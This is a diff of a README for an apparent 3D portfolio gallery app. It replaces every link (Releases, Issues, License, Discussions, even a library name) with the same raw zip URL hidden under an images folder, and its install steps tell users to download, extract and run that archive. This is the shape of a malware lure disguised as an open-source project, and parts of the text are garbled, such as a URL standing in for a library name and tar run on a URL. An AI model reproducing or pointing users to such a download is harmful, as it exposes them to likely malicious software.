@@ -1,6 +1,6 @@
 # 🎨 3d-interactive-gallery - Create Stunning Visual Portfolios Easily
 
-[![Download](https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip)](https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip)
+[![Download](https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip)](https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ Before you begin, ensure your device meets these basic requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip) to download the latest version of the gallery.
+To get started, visit our [Releases page](https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip) to download the latest version of the gallery.
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release.
-3. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip` for Linux). 
+3. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip` for Linux). 
 
 ### Installation Steps
 
@@ -42,7 +42,7 @@ To get started, visit our [Releases page](https://raw.githubusercontent.com/Sjdi
 2. Navigate to the folder where you downloaded the file.
 3. Run the command:
    ```bash
-   tar -xvf https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip
+   tar -xvf https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip
    ```
 4. Navigate into the extracted folder and run the application.
 
@@ -72,13 +72,13 @@ If you encounter any issues:
 - Check your internet connection.
 - Restart the application if it doesn’t respond.
 
-If problems persist, you can reach out for support on the [GitHub Issues page](https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip).
+If problems persist, you can reach out for support on the [GitHub Issues page](https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip).
 
 ## 🌐 Topics
 
 This project relies on several powerful technologies to function effectively:
 
-- **https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip**: A popular library for 3D graphics in the browser.
+- **https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip**: A popular library for 3D graphics in the browser.
 - **GSAP**: For smooth animations and transitions.
 - **WebGL**: To render 3D graphics directly in your browser.
 - **HTML5**: For structuring the web content.
@@ -88,10 +88,10 @@ This project relies on several powerful technologies to function effectively:
 
 This project is licensed under the MIT License. Feel free to use and modify it for your needs. Contributions are welcome!
 
-For further information, refer to the [LICENSE file](https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip).
+For further information, refer to the [LICENSE file](https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip).
 
 ## 📞 Contact
 
-If you have questions or suggestions, please contact us via the Issues page, or check out our [Discussions](https://raw.githubusercontent.com/Sjdic7/3d-interactive-gallery/main/undocumented/3d-interactive-gallery.zip).
+If you have questions or suggestions, please contact us via the Issues page, or check out our [Discussions](https://github.com/Sjdic7/3d-interactive-gallery/raw/refs/heads/main/public/images/interactive_d_gallery_v1.7.zip).
 
 Thank you for using the 3D Interactive Gallery! Your feedback helps us improve the application. Enjoy creating your visual portfolio!
